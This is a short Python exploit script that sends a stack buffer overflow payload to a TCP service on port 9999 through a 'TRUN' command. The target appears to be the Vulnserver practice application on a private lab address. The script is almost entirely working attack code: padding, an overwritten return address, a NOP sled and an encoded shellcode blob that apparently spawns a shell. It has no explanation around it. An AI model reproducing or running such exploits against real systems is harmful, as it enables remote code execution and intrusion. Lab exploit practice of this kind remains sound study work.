import socket
import os
import sys

ip = '192.168.56.138'
port = 9999
length = 2900

buffer = b"A" * 2003
eip =  b"\xaf\x11\x50\x62" # 0x625011af
nops = b"\x90" * 16
buf =  b""
buf += b"\xdb\xc3\xd9\x74\x24\xf4\xb8\xc3\xf6\x8f\x30\x5a"
buf += b"\x29\xc9\xb1\x53\x31\x42\x17\x83\xea\xfc\x03\x81"
buf += b"\xe5\x6d\xc5\xf9\xe2\xf0\x26\x01\xf3\x94\xaf\xe4"
buf += b"\xc2\x94\xd4\x6d\x74\x25\x9e\x23\x79\xce\xf2\xd7"
buf += b"\x0a\xa2\xda\xd8\xbb\x09\x3d\xd7\x3c\x21\x7d\x76"
buf += b"\xbf\x38\x52\x58\xfe\xf2\xa7\x99\xc7\xef\x4a\xcb"
buf += b"\x90\x64\xf8\xfb\x95\x31\xc1\x70\xe5\xd4\x41\x65"
buf += b"\xbe\xd7\x60\x38\xb4\x81\xa2\xbb\x19\xba\xea\xa3"
buf += b"\x7e\x87\xa5\x58\xb4\x73\x34\x88\x84\x7c\x9b\xf5"
buf += b"\x28\x8f\xe5\x32\x8e\x70\x90\x4a\xec\x0d\xa3\x89"
buf += b"\x8e\xc9\x26\x09\x28\x99\x91\xf5\xc8\x4e\x47\x7e"
buf += b"\xc6\x3b\x03\xd8\xcb\xba\xc0\x53\xf7\x37\xe7\xb3"
buf += b"\x71\x03\xcc\x17\xd9\xd7\x6d\x0e\x87\xb6\x92\x50"
buf += b"\x68\x66\x37\x1b\x85\x73\x4a\x46\xc2\xb0\x67\x78"
buf += b"\x12\xdf\xf0\x0b\x20\x40\xab\x83\x08\x09\x75\x54"
buf += b"\x6e\x20\xc1\xca\x91\xcb\x32\xc3\x55\x9f\x62\x7b"
buf += b"\x7f\xa0\xe8\x7b\x80\x75\x84\x73\x27\x26\xbb\x7e"
buf += b"\x97\x96\x7b\xd0\x70\xfd\x73\x0f\x60\xfe\x59\x38"
buf += b"\x09\x03\x62\x57\x96\x8a\x84\x3d\x36\xdb\x1f\xa9"
buf += b"\xf4\x38\xa8\x4e\x06\x6b\x80\xf8\x4f\x7d\x17\x07"
buf += b"\x50\xab\x3f\x9f\xdb\xb8\xfb\xbe\xdb\x94\xab\xd7"
buf += b"\x4c\x62\x3a\x9a\xed\x73\x17\x4c\x8d\xe6\xfc\x8c"
buf += b"\xd8\x1a\xab\xdb\x8d\xed\xa2\x89\x23\x57\x1d\xaf"
buf += b"\xb9\x01\x66\x6b\x66\xf2\x69\x72\xeb\x4e\x4e\x64"
buf += b"\x35\x4e\xca\xd0\xe9\x19\x84\x8e\x4f\xf0\x66\x78"
buf += b"\x06\xaf\x20\xec\xdf\x83\xf2\x6a\xe0\xc9\x84\x92"
buf += b"\x51\xa4\xd0\xad\x5e\x20\xd5\xd6\x82\xd0\x1a\x0d"
buf += b"\x07\xe0\x50\x0f\x2e\x69\x3d\xda\x72\xf4\xbe\x31"
buf += b"\xb0\x01\x3d\xb3\x49\xf6\x5d\xb6\x4c\xb2\xd9\x2b"
buf += b"\x3d\xab\x8f\x4b\x92\xcc\x85"
shellcode = buf
buffer2 = b"C" * (length - len(eip+nops+buffer+shellcode))

payload =  buffer + eip + nops + shellcode + buffer2
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((ip, port))

print(s.recv(1024))

s.send(b"TRUN /.:/" + payload )

print(s.recv(1024))

s.close()
